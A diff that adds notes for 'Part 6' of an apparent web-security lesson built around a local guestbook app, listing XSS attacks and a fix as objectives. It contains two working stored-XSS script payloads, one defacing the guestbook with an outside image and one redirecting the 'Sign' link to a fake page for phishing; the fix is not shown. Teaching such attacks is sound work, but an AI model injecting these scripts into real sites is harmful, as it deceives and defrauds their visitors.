@@ -1,0 +1,26 @@
+==================================================
+Part 6 Objectives
+==================================================
+
+- XSS attacks! (use code from Part 5)
+- A working fix (use code from Part 6)
+
+
+
+//XSS
+
+//this attack defaces the site
+<script>
+document.getElementById("guestbook").innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Anonymous_at_Scientology_in_Los_Angeles.jpg/640px-Anonymous_at_Scientology_in_Los_Angeles.jpg" />';
+</script>
+
+
+//this attack changes the destination of the "Sign" link; this could be used for a phishing site
+<script>
+var all = document.getElementsByTagName('a');
+for( i = 0; i < all.length; i++ ) {
+    if (all[i].href == 'http://localhost/guestbook/sign.php') {
+      all[i].setAttribute("href", "fakesign.php");
+    }
+}
+</script>
